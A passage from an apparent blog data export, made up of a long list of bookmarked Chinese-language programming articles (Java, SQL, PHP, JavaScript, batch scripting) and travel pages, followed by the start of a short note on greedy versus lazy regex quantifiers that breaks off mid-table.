::\nhttp://cookiesp.pixnet.net/blog/post/84190702-android-intent%26bundle-%E5%82%B3%E9%81%9E%E8%B3%87%E6%96%99(%E5%8C%85%E5%90%AB%E5%82%B3%E9%81%9E%E8%87%AA%E5%AE%9A%E7%BE%A9%E7%89%A9\n\nAndroid Activity 生命周期研究记录 - 不单单是 Android 研发 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/song314/article/details/20706963\n\njava.util.Properties 的應用：setProperty, getProperty, storeToXML, loadFromXML @ 符碼記憶\nhttp://www.ewdna.com/2008/12/javautilpropertiessetproperty.html\n\nNodeSchool\nhttps://nodeschool.io/\n\nabout:blank\nabout:blank\n\n筆記本而已: PHP 中 htmlentities 跟 htmlspecialchars 的區別\nhttp://lifeiskuso.blogspot.com/2009/08/php-htmlentities-htmlspecialchars.html\n\n不允許存取\nhttps://www.blogger.com/blogin.g?blogspotURL=http://xr22.blogspot.tw/2012/04/twig-template-engine-php.html\n\n安装 · Twig-cn\nhttps://lupuxyz.gitbooks.io/twig-cn/content/installation.html\n\nPSR-2 PHP Coding Style | 點燈坊\nhttp://oomusou.io/php/php-psr2/\n\nFind element in array | Level Up Lunch\nhttps://www.leveluplunch.com/java/examples/find-element-in-array/\n\nIBM Knowledge Center\nhttps://www.ibm.com/support/knowledgecenter/SSEPGG_9.7.0/com.ibm.swg.im.dbclient.php.doc/doc/t0023135.html\n\nabout:blank\nabout:blank\n\n頁面載入發生問題\nhttp://lavasoft.blog.51cto.com/62575/12416/\n\nDocker daemon 因為網路設定而無法啟動 « My Codetub\nhttp://mycodetub.logdown.com/posts/798962-docker-daemon-because-the-network-is-set-to-start\n\nSQL JOIN 語法順序與效能之推論 | InspireGate\nhttp://inspiregate.windspeaker.co/post/3816-sql-join-syntax-and-performance-of-inference-in-order\n\nGit · GitBook\nhttps://www.gitbook.com/book/zlargon/git-tutorial/details\n\nJDK 中 ArrayList、HashMap 和 HashSet 的 equals 方法源码分析 - bigconvience 的专栏 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/bigconvience/article/details/45972289\n\nDB 著魔錄: DB2 中文問題\nhttp://dbmagicon.blogspot.com/2008/07/db2.html\n\nsql - Querying oracle clob column - Stack Overflow\nhttp://stackoverflow.com/questions/18250014/querying-oracle-clob-column\n\nJavaScript 事件冒泡和事件委托 « PureWeber – 纯粹互联网\nhttps://www.pureweber.com/article/event-delegation/\n\nSQL Like with a subquery - Stack Overflow\nhttp://stackoverflow.com/questions/17177779/sql-like-with-a-subquery\n\nPython 爬蟲新手筆記 - Pala.tw\nhttp://pala.tw/python-web-crawler/\n\nPython 用 WMI 模块获取 windowns 系统信息 - 王伟 - 51CTO 技术博客\nhttp://wangwei007.blog.51cto.com/68019/1158075\n\nPython work with WIM 列出目前電腦的 Process - Python*NoteBook\nhttp://wiki.alarmchang.com/index.php?title=Python_work_with_WIM*%E5%88%97%E5%87%BA%E7%9B%AE%E5%89%8D%E9%9B%BB%E8%85%A6%E7%9A%84_Process\n\n首頁 - ReactJS 新聞電子報\nhttps://reactjs-tw.top/\n\n如何相互转换逗号分隔的字符串和 List (Java 程序员日记 2015/03/06) - jicahoo 的专栏 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/jicahoo/article/details/44105109\n\nAllenLin 的部落格: [Java] ArrayList 轉 Array\nhttp://sd810.blogspot.com/2011/03/javaarraylistarray.html\n\njavascript - 'console' is undefined error for Internet Explorer - Stack Overflow\nhttp://stackoverflow.com/questions/3326650/console-is-undefined-error-for-internet-explorer\n\nTomcat 的 JVM 設置和連接數設置 @ 資訊園 :: 痞客邦 PIXNET ::\nhttp://fecbob.pixnet.net/blog/post/38257503-tomcat%E7%9A%84jvm%E8%A8%AD%E7%BD%AE%E5%92%8C%E9%80%A3%E6%8E%A5%E6%95%B8%E8%A8%AD%E7%BD%AE\n\n跳躍的海豚: Apache Tomcat 6 的記憶體配置 (效能調整)\nhttp://fly-dolphin.blogspot.com/2011/10/apache-tomcat-6.html\n\nHTML FORM elements 與 submit | 阿沙布魯 - 點部落\nhttps://dotblogs.com.tw/brooke/2014/07/12/145918\n\nRemote Desktop Organizer (RDO) 1.4.7 免安裝版 - 取代微軟遠端桌面 - 阿榮福利味 - 免費軟體下載\nhttp://www.azofreeware.com/2010/06/remote-desktop-organizer-142.html\n\n在 Postman 中使用不受信任的 SSL 证书（转） - 平和的心 - 博客园\nhttp://www.cnblogs.com/ajianbeyourself/p/3899729.html\n\n[討論] FineReport 與 iReport 的幾大功能對比 | 列印 - 第 1 頁 | T17 討論區 - 一起分享好東西\nhttp://t17.techbang.com/topics/35119-finereport-in-contrast-to-several-functions-of-ireport?mode=print&page=1\n\n[Windows]忘記或遺失 Windows Administrator 帳號時的搶救方式 | 五餅二魚工作室 - 點部落\nhttps://dotblogs.com.tw/jamesfu/2014/10/21/lostadministratorpassword\n\nE-Office 學園 • 檢視主題 - [98] Web 應用程式中文編碼問題\nhttp://eoffice.im.fju.edu.tw/phpbb/viewtopic.php?p=29212\n\nSEO 不是只靠關鍵字！網站的 SEO 診療師「球來就打」，一眼看穿五大電商網站 SEO 優化狀況 | T 客邦 - 我只推薦好東西\nhttp://www.techbang.com/posts/47588-ball-hits\n\n頁面載入發生問題\nhttp://www.tomytime.com/archives/296/\n\nLeetCode Online Judge\nhttps://leetcode.com/\n\nSQL Server 2008 匯出 excel 檔 | FAQ Book\nhttp://blog.faq-book.com/?p=492\n\n假面俱樂部: [WebSphere 6] About UTF-8 的設定\nhttp://webcache.googleusercontent.com/search?q=cache:rFeRjw9R9CAJ:ultrapan.blogspot.com/2010/09/websphere-6-about-utf-8.html+&cd=21&hl=zh-TW&ct=clnk&gl=tw\n\nIE 濾鏡特效 | 摩刻部落\nhttps://www.moke.tw/wordpress/IEfilterTest.htm\n\nCSS3 與濾境(10)－物件旋轉 – 摩刻部落\nhttp://www.moke.tw/wordpress/computer/web/295#Flip\n\nJWorld@TW Java 論壇 - JSTL1.1 中的 JavaBean 取值問題\nhttps://www.javaworld.com.tw/jute/post/view?bid=6&id=44914&sty=1&tpg=2&age=0\n\nleft outer inner join - Google 搜尋\nhttps://www.google.com.tw/search?q=left+outer+inner+join&source=lnms&tbm=isch&sa=X&ved=0ahUKEwi3r5zY997QAhWMi5QKHSbdD8oQ_AUICCgB&biw=1280&bih=889#imgrc=vbpgNfoptCySiM%3A\n\n判斷字串裡是否有中文字 - kait - BlogJava\nhttp://www.blogjava.net/kait/archive/2011/03/10/346102.html\n\nprogram:javascript:setattribute 的問題 [MasterDragon 技術備忘錄]\nhttp://lang.idv.tw/doku.php/program/javascript/setattribute%E7%9A%84%E5%95%8F%E9%A1%8C\n\nJavascript JSON comparison/diff? - Stack Overflow\nhttp://stackoverflow.com/questions/10357830/javascript-json-comparison-diff\n\nSQL Fiddle\nhttp://sqlfiddle.com/#!2/84e0a/52\n\nwhere，group by 和 having 的使用时的最大区别 - 调试易\nhttp://www.debugease.com/mssqlbasic/800884.html\n\nError 404 (Not Found)!!1\nhttp://webcache.googleusercontent.com/search?q=cache:Un6BxT4LMnYJ:starshine.pixnet.net/blog/\npost/30402669-%255B%25E9%259B%259C%25E8%25A8%2598%255D-ultravnc-%25E9%259C%2580%25E8%25A6%2581%25E4%25B8%258D%25E5%2581%259C%25E9%2587%258D%25E6%2596%25B0%25E6%2595%25B4%25E7%2590%2586(refresh)%25E7%259A%2584%25E8%25A7%25A3%25E6%25B1%25BA+&cd=24&hl=zh-TW&ct=clnk&gl=tw\n使用 VLOOKUP、INDEX 或 MATCH 尋找值 - Excel\nhttps://support.office.com/zh-tw/article/%E4%BD%BF%E7%94%A8-VLOOKUP%E3%80%81INDEX-%E6%88%96-MATCH-%E5%B0%8B%E6%89%BE%E5%80%BC-7144ef3f-e322-4f95-9e96-f1d743270438\n\nphp - 解決 Allowed memory size of 134217728 bytes exhausted 問題 @ Life Is Struggle :: 隨意窩 Xuite 日誌\nhttp://webcache.googleusercontent.com/search?q=cache:trFLi92xPOMJ:blog.xuite.net/choubee/\nblog/46452700-php%2B-%2B%25E8%25A7%25A3%25E6%25B1%25BA%2BAllowed%2Bmemory%2Bsize%2Bof%2B134217728%2Bbytes%2Bexhausted%2B%25E5%2595%258F%25E9%25A1%258C+&cd=1&hl=zh-TW&ct=clnk&gl=tw\n用 python 抓網頁 data,及做圖表之五：抓網頁內建庫 urllib 及第三方庫 BeautifulSoup 的使用 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天\nhttp://ithelp.ithome.com.tw/articles/10127973\n\n解决 IE8 不支持数组的 indexOf 方法 - JustRun - 博客园\nhttp://www.cnblogs.com/JustRun1983/archive/2013/04/02/2996650.html\n\nUse jQuery's $.closest() vs $.parents() — SitePoint\nhttps://webcache.googleusercontent.com/search?q=cache:j4_aJlq-TOUJ:https://www.sitepoint.com/jquerys-closest-parents/+&cd=3&hl=zh-TW&ct=clnk&gl=tw\n\nSQL 2012 新功能 OFFSET-FETCH @ Louis 學習筆記 :: 痞客邦 PIXNET ::\nhttp://webcache.googleusercontent.com/search?q=cache:-kuGRcOM_IoJ:louis176127.pixnet.net/blog/\npost/183637807-sql-2012%25E6%2596%25B0%25E5%258A%259F%25E8%2583%25BD-offset-fetch+&cd=3&hl=zh-TW&ct=clnk&gl=tw&lr=lang_zh-TW\nhttp://blog.miniasp.com/post/2009/11/03/How-to-get-system-date-time-in-batch-file-part-III.aspx\nhttp://blog.miniasp.com/post/2009/11/03/How-to-get-system-date-time-in-batch-file-part-III.aspx\n\nDOS 批处理输出日期时分秒星期（年-月-日 时-分-秒）\nhttp://www.edbiji.com/doccenter/showdoc/31/nav/297.html\n\nDOS 不死 系列文章列表 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天\nhttp://ithelp.ithome.com.tw/users/20005121/ironman/213\n\n自動備份 Log 的 Batch 小程式 ~ Night Wind's\nhttp://www.nws.tw/2012/01/logbatch.html\n\nBAT 批次指令： IF 的功能介紹 - 一般電腦軟體討論 - 麻辣家族討論版版\nhttp://forum.twbts.com/thread-10186-1-1.html\n\nApache 連線數已滿,如何將之後連線的導向另一個網頁(告知 server 達上限人數)???\nhttp://phorum.study-area.org/index.php?topic=28689.0\n\nhttp://ww1.jstorage.info/\nhttp://ww1.jstorage.info/\n\n2016 年の前端，瘋什麼 ReactJS？ – 前端魔法研究室 – Medium\nhttps://medium.com/4cats-io/2016-%E5%B9%B4%E3%81%AE%E5%89%8D%E7%AB%AF-%E7%98%8B%E4%BB%80%E9%BA%BC-reactjs-4727a6ecc85a\n\n如何在 Windows 下撰寫批次檔，簡化常態性工作？ | iThome\nhttp://www.ithome.com.tw/node/47779\n\nhttp://blog.miniasp.com/post/2009/06/24/Sleep-command-in-Batch.aspx\nhttp://blog.miniasp.com/post/2009/06/24/Sleep-command-in-Batch.aspx\n\n各浏览器对 document.getElementById 等方法的实现差异 - snandy - 博客园\nhttp://www.cnblogs.com/snandy/archive/2011/03/24/1993380.html\n\n軽井沢 石の教会 内村鑑三記念堂\nhttp://www.stonechurch.jp/\n\n2017 日本東京、日光、鬼怒川自由行行程規劃 @ King Chen 旅遊札記(ikimasho travel notes) :: 痞客邦 PIXNET ::\nhttp://ch3126.pixnet.net/blog/\npost/108710125-2017%E6%97%A5%E6%9C%AC%E6%9D%B1%E4%BA%AC%E3%80%81%E6%97%A5%E5%85%89%E3%80%81%E9%AC%BC%E6%80%92%E5%B7%9D%E8%87%AA%E7%94%B1%E8%A1%8C%E8%A1%8C%E7%A8%8B%E8%A6%8F%E5%8A%83\n▌ 東京自由行 ▌♥ 輕井澤一日遊行程分享 ♥ 輕井澤交通+JR 東京廣域周遊券 JR Tokyo Wide Pass (高原教堂、石之教堂、星野溫泉、輕井澤王子 outlet)by 陽光男孩 @ 野蠻王妃愛漂亮 :: 痞客邦 PIXNET ::\nhttp://cline1413.pixnet.net/blog/post/426749051--%E2%96%8C%E6%9D%B1%E4%BA%AC%E8%87%AA%E7%94%B1%E8%A1%8C-%E2%96%8C%E2%99%A5-%E8%BC%95%E4%BA%95%E6%BE%A4%E4%B8%80%E6%97%A5%E9%81%8A%E8%A1%8C%\nE7%A8%8B%E5%88%86%E4%BA%AB%E2%99%A5\n【日光】從淺草出發交通案內＆各種周遊券介紹 @ 乖乖做好 :: 痞客邦 PIXNET ::\nhttp://iiko.pixnet.net/blog/post/306715923-%E3%80%90%E6%97%A5%E5%85%89%E3%80%91%E5%BE%9E%E6%B7%BA%E8%8D%89%E5%87%BA%E7%99%BC%E4%BA%A4%E9%80%9A%E6%A1%88%E5%85%A7%EF%BC%86%E5%90%84%E7%A8%AE\n%E5%91%A8%E9%81%8A%E5%88%B8%E4%BB%8B\n草莓吃到飽之親吻櫪乙女@日光 @ E=(km)^2 :: 痞客邦 PIXNET ::\nhttp://kanagawalin.pixnet.net/blog/post/342444416-%E8%8D%89%E8%8E%93%E5%90%83%E5%88%B0%E9%A3%BD%E4%B9%8B%E8%A6%AA%E5%90%BB%E6%AB%AA%E4%B9%99%E5%A5%B3@%E6%97%A5%E5%85%89\n\n<<日本泡湯不用好害羞唷～>> @ 原(HARA)さんおすすめの旅 :: 痞客邦 PIXNET ::\nhttp://ychiati121.pixnet.net/blog/post/268043102-%3C%3C%E6%97%A5%E6%9C%AC%E6%B3%A1%E6%B9%AF%E4%B8%8D%E7%94%A8%E5%A5%BD%E5%AE%B3%E7%BE%9E%E5%94%B7%EF%BD%9E%3E%3E\n\n构建系统搭建记录 · Issue #43 · cosven/cosven.github.io\nhttps://github.com/cosven/cosven.github.io/issues/43\n\nhttp://ephrain.pixnet.net/blog/post/61770874-%5Bdocker%5D-%E4%BD%BF%E7%94%A8%E9%9D%9E-root-%E6%AC%8A%E9%99%90%E4%BE%86%E5%9F%B7%E8%A1%8C-docker-client\nhttp://ephrain.pixnet.net/blog/post/61770874-%5Bdocker%5D-%E4%BD%BF%E7%94%A8%E9%9D%9E-root-%E6%AC%8A%E9%99%90%E4%BE%86%E5%9F%B7%E8%A1%8C-docker-client\n\nJain's Blog: JAVA - string.split 解決空字串的問題\nhttp://webcache.googleusercontent.com/search?q=cache:7Vi3Uiz8FJcJ:jain0921.blogspot.com/2012/01/java-stringsplit.html+&cd=1&hl=zh-TW&ct=clnk&gl=tw\n\n從東京出發・日光交通攻略 @ 別出馨裁 :: 痞客邦 PIXNET ::\nhttp://hsinyun0531.pixnet.net/blog/post/199564245-%E5%BE%9E%E6%9D%B1%E4%BA%AC%E5%87%BA%E7%99%BC%E3%83%BB%E6%97%A5%E5%85%89%E4%BA%A4%E9%80%9A%E6%94%BB%E7%95%A5\n\nAlly 的旅行小事: 東武鐵道 -- 日光、鬼怒川主題樂園周遊券\nhttp://phoennivia.blogspot.com/2010/08/blog-post_2913.html\n\n[ cmd ] Windows 網芳 net use command 指令 - Evil-M\\$\nhttp://webcache.googleusercontent.com/search?q=cache:0XzHmtANmtcJ:evil-ms.blogspot.com/2010/05/windows-net-use-command.html+&cd=3&hl=zh-TW&ct=clnk&gl=tw\n\nxcopy - 檔案.資料夾複製指令 @ 藍影 :: 痞客邦 PIXNET ::\nhttp://webcache.googleusercontent.com/search?q=cache:8Ht3irTdHlgJ:edisonshih.pixnet.net/blog/\npost/28109815-xcopy---%25E6%25AA%2594%25E6%25A1%2588.%25E8%25B3%2587%25E6%2596%2599%25E5%25A4%25BE%25E8%25A4%2587%25E8%25A3%25BD%25E6%258C%2587%25E4%25BB%25A4+&cd=2&hl=zh-TW&ct=clnk&gl=tw\n破解網頁鎖圖，鎖右鍵，選取等功能\nhttps://www.puritys.me/docs-blog/\narticle-77-%E7%A0%B4%E8%A7%A3%E7%B6%B2%E9%A0%81%E9%8E%96%E5%9C%96%EF%BC%8C%E9%8E%96%E5%8F%B3%E9%8D%B5%EF%BC%8C%E9%81%B8%E5%8F%96%E7%AD%89%E5%8A%9F%E8%83%BD.html\n不排序去除文件中的重复行\nhttp://edyfox.codecarver.org/html/bash_unique_lines_no_sorting.html\n\n日本行李 - HackMD\nhttps://hackmd.io/MYVgzCAcYJwIYFoCmAjYB2BAWOA2RcSYYCAZgEzoojmRFakxA===#\n\n30 秒認識 MQTT – 阿喵就像家\nhttps://mlwmlw.org/2015/09/30-%E7%A7%92%E8%AA%8D%E8%AD%98-mqtt/\n\nSocket 与 WebSocket | zrong's blog\nhttp://zengrong.net/post/2199.htm\n\n[ CSS ] – table thead 固定 – 混水摸魚 ╮(╯▽╰)╭\nhttps://www.webteach.tw/?p=701\n\nCSS Table Scrolling with Fixed Header for IE 7\nhttp://geekswithblogs.net/LSheu/archive/2009/01/30/css-table-scrolling-with-fixed-header-for-ie-7.aspx\n\nCreating Cross-Browser Scrollable <tbody>s—A CSS-Only Approach\nhttps://www.tjvantoll.com/2012/11/10/creating-cross-browser-scrollable-tbody/\n\nAdobe Experience Design(XD)怎麼用？有教學嗎？\nhttps://iask.tw/q/21WMS\n\nPHP 裡 Foreach 一些測試 « darkland's Blog\nhttp://jslee.logdown.com/posts/3107-foreach-in-php-testing\n\nk1n9's blog\nhttp://k1n9.me/\n\nBAT 檔執行時最小化 @ Thinking in Robert :: 痞客邦 PIXNET ::\nhttp://webcache.googleusercontent.com/search?q=cache:Md_PwfjG6a4J:robertvmp.pixnet.net/blog/\npost/26312642-bat-%25E6%25AA%2594%25E5%259F%25B7%25E8%25A1%258C%25E6%2599%2582%25E6%259C%2580%25E5%25B0%258F%25E5%258C%2596+&cd=6&hl=zh-TW&ct=clnk&gl=tw\njquery - Prevent users from submitting a form by hitting Enter - Stack Overflow\nhttp://stackoverflow.com/questions/895171/prevent-users-from-submitting-a-form-by-hitting-enter\n\nT-SQL 中的 JOIN 語法解析 (for SQL Server) | 我的學習筆記 - 點部落\nhttps://dotblogs.com.tw/caubekimo/2010/07/28/16874\n\ntsql - LEFT JOIN vs. LEFT OUTER JOIN in SQL Server - Stack Overflow\nhttp://stackoverflow.com/questions/406294/left-join-vs-left-outer-join-in-sql-server\n\nSelect2 - The jQuery replacement for select boxes\nhttps://select2.github.io/\n\nSaML002-HK\nhttp://saml002hk.blogspot.com/\n\nMUKI space\\* - Simple, Personal and Life Style\nhttp://muki.tw/\n\n2016 年十个必须尝试的设计工具\\_慕课手记\nhttp://www.imooc.com/article/3549\n\n稀土区 - 优质设计开发资源分享\nhttps://xituqu.com/\n\nThe best UX Prototyping Tools for mobile and desktop app design\nhttp://www.prototypr.io/\n\n7 Steps From jQuery Plugins to React Development\nhttp://dimaip.github.io/2017/02/15/from-jquery-to-react/\n\n[jQuery]使用 jQuery 對 select 的操作 | 完美的半徑 - 點部落\nhttps://dotblogs.com.tw/alanjiang/2011/01/26/21061\n\n[javascript] 日曆製作方式| @ 資訊園 :: 痞客邦 PIXNET ::\nhttp://fecbob.pixnet.net/blog/post/43093030-%5Bjavascript%5D-%E6%97%A5%E6%9B%86%E8%A3%BD%E4%BD%9C%E6%96%B9%E5%BC%8F%7C\n\nSphinx 初尝 — Sphinx 使用手册\nhttps://zh-sphinx-doc.readthedocs.io/en/latest/tutorial.html\n\nmsoedov/hacker-slides: A small UI for building presentation slides from markdown markup\nhttps://github.com/msoedov/hacker-slides\n\nPandoc - Markdown 轉 PDF 格式 - 機械設計專題 (虎尾科大 MDE)\nhttp://project.mde.tw/blog/pandoc-markdown-zhuan-pdf-ge-shi.html\n\n[請益] windows 背景執行 - 看板 PHP - 批踢踢實業坊\nhttps://www.ptt.cc/bbs/PHP/M.1334048685.A.A85.html\n\nVuejs2.0 文档攻略 - 组件 -动态组件\nhttp://larabase.com/posts/filter/category/9\n\nNULLIF(expr1,expr2)和 CASE 表达式 - 程序园\nhttp://www.voidcn.com/blog/topsjava/article/p-3787747.html\n\n扭蛋盒玩專用展示盒 收藏盒 塑膠盒 pvc 盒 22x15x15 可放進海賊王水都娜美 DX 景品 蛇姬女帝 亂馬 1/2 - 露天拍賣\nhttp://goods.ruten.com.tw/item/show?21203184399417#info\n\n亞克力高達展示盒定做拼裝樂高防塵罩動漫手辦汽車模型盒高檔透明-淘宝网全球站\nhttps://world.taobao.com/\nitem/520559525288.htm?fromSite=main&ali_refid=a3_430620_1006:1105650261:N:%E6%A8%A1%E5%9E%8B%E7%9B%92:927bc8399452d6aa3269f92b73f6606c&ali_trackid=1_927bc8399452d6aa3269f92b73f6606c\nSD9012: IE6 IE7 IE8 中 getElementsByName 方法的参数不区分大小写 - W3Help\nhttp://w3help.org/zh-cn/causes/SD9012\n\nBX9010: 各浏览器中对直接以 id 或者 name 属性值获取元素存在差异 - W3Help\nhttp://w3help.org/zh-cn/causes/BX9010\n\nTibaMe\nhttps://www.tibame.com/q?pg=home_welcomeRedirected&cx=22.20000\n\n浏览器同源政策及其规避方法 - 阮一峰的网络日志\nhttp://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html\n\nIE11 で Alt+Home、Alt+F4、Ctrl+F4 の制御が効かない · Issue #8 · pekotaro/disableBrowserShortcutKeys\nhttps://github.com/Pekotaro/disableBrowserShortcutKeys/issues/8\n\nJWorld@TW Java 論壇 - String a = null 是什么含义啊\nhttps://www.javaworld.com.tw/jute/post/view?bid=29&id=73474\n\nevents - javascript capture browser shortcuts (ctrl+t/n/w) - Stack Overflow\nhttp://stackoverflow.com/questions/7295508/javascript-capture-browser-shortcuts-ctrlt-n-w\n\n502 Bad Gateway\nhttp://www.15jb.net/article/4303.html\n\njavascript - IE e.target.id is not working - Stack Overflow\nhttp://stackoverflow.com/questions/1143196/ie-e-target-id-is-not-working\n\n瓶水相逢 - 艾小克 - 點部落\nhttps://dotblogs.com.tw/chhuang\n\nHow to copy TEXT to Clipboard on Button-Click\nhttps://codepen.io/shaikmaqsood/pen/XmydxJ/\n\nRe: [請益] 有無比較程式碼差異性的軟體 - 看板 EZsoft - 批踢踢實業坊\nhttps://www.ptt.cc/bbs/EZsoft/M.1206798987.A.8A9.html\n\nhttp://absoluteyl.blogspot.com/2015/08/raspbian-raspbian.html\nhttp://absoluteyl.blogspot.com/2015/08/raspbian-raspbian.html\n\n[講座分享] 就此愛上 PhpStorm — 以 Laravel 開發為例 (線上讀書會) – Medium\nhttps://medium.com/@shengyou/full-in-love-with-phpstorm-f6d484109978\n\nAndroid 反編譯與防止被反編譯 | MagicLen\nhttps://magiclen.org/android-decompiler/\n\nDiff Chars\nhttp://kpdecker.github.io/jsdiff/\n\ncemerick/jsdifflib: A javascript library for diffing text and generating corresponding HTML views\nhttps://github.com/cemerick/jsdifflib\n\nMergely - Diff online, merge documents\nhttp://www.mergely.com/editor\n\nJavaScript based diff utility - Stack Overflow\nhttp://stackoverflow.com/questions/3053587/javascript-based-diff-utility\n\nSpirit's development notebook\nhttp://spirit-blog.logdown.com/\n\nServer Push: Websockets in HTML5\nhttp://onlinepush.blogspot.com/2014/09/websockets-in-html5.html\n\n新手向：Vue 2.0 的建议学习顺序 - 知乎专栏\nhttps://zhuanlan.zhihu.com/p/23134551\n\nCreate a Desktop Quiz Application Using Vue.js and Electron | Scotch\nhttps://scotch.io/tutorials/create-a-desktop-quiz-application-using-vue-js-and-electron\n\n衞生署學生健康服務 - 漸進式肌肉鬆弛練習\nhttp://www.studenthealth.gov.hk/tc_chi/relaxation/relaxation.html\n\n少年，不要滥用箭头函数啊 · jingsam\nhttps://jingsam.github.io/2016/12/08/things-you-should-know-about-arrow-functions.html\n\n你不知道的 This 和 Class - 每日頭條\nhttps://kknews.cc/zh-tw/other/l8oz3bz.html\n\nhtml - difference between width auto and width 100 percent - Stack Overflow\nhttp://stackoverflow.com/questions/17468733/difference-between-width-auto-and-width-100-percent\n\nCollapsing margins——合并的外边距 | GeekPlux\nhttp://geekplux.com/2014/03/14/collapsing_margins.html\n\njQuery Validation Engine 表单验证 - 前端开发仓库\nhttp://code.ciaoca.com/jquery/validation-engine/\n\nA-Fu Design 網頁設計,程式設計,jQuery,JavaScripts,PHP,MySql,軟體開發,網頁製作\nhttps://fufuk.blogspot.com/\n\nWeb 在線教程\nhttp://www.w3big.com/zh-TW/index.html\n\nHow do I save data in an application scope in PHP? - Stack Overflow\nhttp://stackoverflow.com/questions/3713311/how-do-i-save-data-in-an-application-scope-in-php\n\nBGM 素材 | フリー BGM・音楽素材 MusMus\nhttp://musmus.main.jp/bgm.html\n\n标签 - justjavac(迷渡)\nhttp://justjavac.com/tags.html#%E6%B5%AE%E7%82%B9%E6%95%B0-ref\n\nJS 魔法堂：彻底理解 0.1 + 0.2 === 0.30000000000000004 的背后 - ^\\_^肥子 John - SegmentFault\nhttps://segmentfault.com/a/1190000005022170\n\nRaspberry Pi 的應用 - 數位音樂播放器的再進化：Volumio 2 | IT 技術家\nhttp://blog.itist.tw/2016/11/build-audiophile-music-player-with-volumio2-on-raspberry-pi.html\n\n區域網設備發現之 Bonjour 協議 - 每日頭條\nhttps://kknews.cc/zh-tw/tech/o4ybmm.html\n\neclipse 启动优化，终于不那么卡了！ - 飞网\nhttp://www.cfei.net/archives/445\n\n纯前端 Js 解决各种汉字 urlencode,urldecode（GBK、UTF-8 均可） – zcw 的博客\nhttp://zcw.me/blogwp/front-end-urldecode-gbk/\n\nhttp://coldnew.github.io/3aac9391/\nhttp://coldnew.github.io/3aac9391/\n\n使用 Docker 建置 Gitlab CE 的 Source Control 及 CI 環境 · JIGSAWYE\nhttps://jigsawye.com/2015/09/25/gitlab-ce-in-docker/\n\njavascript - Event binding on dynamically created elements? - Stack Overflow\nhttp://stackoverflow.com/questions/203198/event-binding-on-dynamically-created-elements/27373951#27373951\n\n事件处理中的 this：attachEvent, addEventListener, onclick | Harttle Land\nhttp://harttle.com/2015/08/14/event-and-this.html\n\nHarttle Land | 致力于简单的、一致的、高效的前端开发\nhttp://harttle.com/\n\nWhy isn't CSS visibility working? - Stack Overflow\nhttp://stackoverflow.com/questions/4929310/why-isnt-css-visibility-working\n\n说说 focus /focusin /focusout /blur 事件 - WEB 前端路上踩过的坑儿 - SegmentFault\nhttps://segmentfault.com/a/1190000003942014\n\nText Compare! - An online diff tool that can find the difference between two texts\nhttps://text-compare.com/\n\nMobaXterm free Xserver and tabbed SSH client for Windows\nhttp://mobaxterm.mobatek.net/\n\nCSS 垂直置中的七個方法 - OXXO.STUDIO\nhttp://www.oxxostudio.tw/articles/201502/css-vertical-align-7methods.html\n\n要改的地方太多了，那就改天吧 – Hello World!\nhttps://blog.user.today/\n\n瀏覽器的渲染原理簡介 | InspireGate\nhttp://inspiregate.windspeaker.co/post/3959-the-browser-39-s-rendering-principle\n\njQuery.floatThead\nhttp://mkoryak.github.io/floatThead/\n\nhttps://www.sitepoint.com/12-amazing-jquery-tables/\nhttps://www.sitepoint.com/12-amazing-jquery-tables/\n\njquery - How do I add slashes to a string in Javascript? - Stack Overflow\nhttp://stackoverflow.com/questions/2195568/how-do-i-add-slashes-to-a-string-in-javascript\n\njavascript-chrome 中连续触发 onblur 事件——CSDN 问答频道\nhttp://ask.csdn.net/questions/352802\n\nOcean 學習筆記: 弧度角度換算\nhttp://contest-start.blogspot.com/2010/02/1.html\n\n好用的 Markdown 编辑器一览-月光博客\nhttp://www.williamlong.info/archives/4319.html\n\n在 JavaScript 中如何创建多行字符串(JavaScript Multiline String) - 宅则愤，达则顺 - ITeye 技术网站\nhttp://yiding-he.iteye.com/blog/58180\n\nshowModelessDialog 改造兼容 firefox 和 ie - 贵贵的博客 - 开发|架构|开源|共享\nhttp://blog.linuxphp.org/archives/1454/\n\nIE GET 亂碼- 藍色小舖 BlueShop\nhttp://www.blueshop.com.tw/board/FUM20041006152627A9N/BRD20100301153624OA4.html\n\njavascript window location href without hash? - Stack Overflow\nhttp://stackoverflow.com/questions/5818269/javascript-window-location-href-without-hash\n\n解決勾到「防止此網頁產生其他對話方塊」 – 要改的地方太多了，那就改天吧\nhttps://blog.user.today/solve-blocking-alert-window/\n\nPress Enter to Submit 背后的那些事 « David Chen's Blog\nhttp://david-chen-blog.logdown.com/posts/177766-how-forms-submit-when-pressing-enter\n\nJS 函数:IsDate—判断日期格式是否正确及是否为有效的日期 - JavaScript - JS 函数 - 天使建站 angelweb.cn\nhttp://www.angelweb.cn/Html/JS/cyhs/2011561425594821.html\n\n20 個優秀的 JavaScript 鍵盤事件處理庫 | 香港矽谷\nhttp://www.hksilicon.com/articles/443131\n\nThings You Might Not Know About jQuery\nhttps://johnresig.com/apps/workshop/adv-talk/#0\n\nThings You Might Not Know About jQuery\nhttps://johnresig.com/apps/workshop/adv-talk/\n\n雲端工具箱, Asana 專案管理系統 (Cloud, Asana) - 大兵萊恩 一路直前\nhttp://gogoprivateryan.blogspot.com/2016/03/asana-cloud-asana.html\n\nWeb 在線教程\nhttp://www.w3ii.com/zh-TW/\n\nregex - What do lazy and greedy mean in the context of regular expressions? - Stack Overflow\nhttp://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions\n\n乱象，印迹 » 一名之立，旬月踟躇\nhttp://www.luanxiang.org/blog/archives/36.html\n","categories":["網站筆記"]},{"title":"[regex]Greedy quantifier 和 Lazy quantifier 筆記","url":"%2Fblog%2F2017%2F04%2F30%2Flogdown%2F2017-04-30-1774877%2F","content":"前幾天在[老闆 來點寇汀吧。 Boss,CODING please.](https://www.facebook.com/bosscodingplease/videos/vb.1813913455528733/1842446952675383/?type=3&theater)製作台灣天氣地圖\n看到使用正規化抓取href=\".*?\"裡面的值\n\n在此學會新的正規化抓取href裡面值\n\nGoogle找到相關文件\n在此記錄筆記\n<!--more-->\n+-------------------+-----------------+---------------------------+\n| Greedy quantifier | Lazy quantifier |        Description        |\n+-------------------+-----------------+---------------------------+\n| *                 | *?              | Match zero or more times. |\n| +                 | +?              | Match one or more times.  |\n| ?                 | ??              | Match zero or one time.   |\n| {n}               | {n}?            | Match 